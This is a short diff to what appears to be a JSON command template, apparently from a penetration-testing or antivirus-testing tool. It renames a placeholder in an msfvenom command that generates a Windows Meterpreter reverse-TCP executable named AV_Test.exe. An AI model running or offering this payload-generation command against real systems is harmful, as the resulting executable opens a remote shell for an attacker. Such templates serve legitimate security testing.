@@ -1,3 +1,3 @@
 {
-    "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$localhost$ LPORT=$localport$ -f exe > AV_Test.exe"
+    "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$localip$ LPORT=$localport$ -f exe > AV_Test.exe"
 }
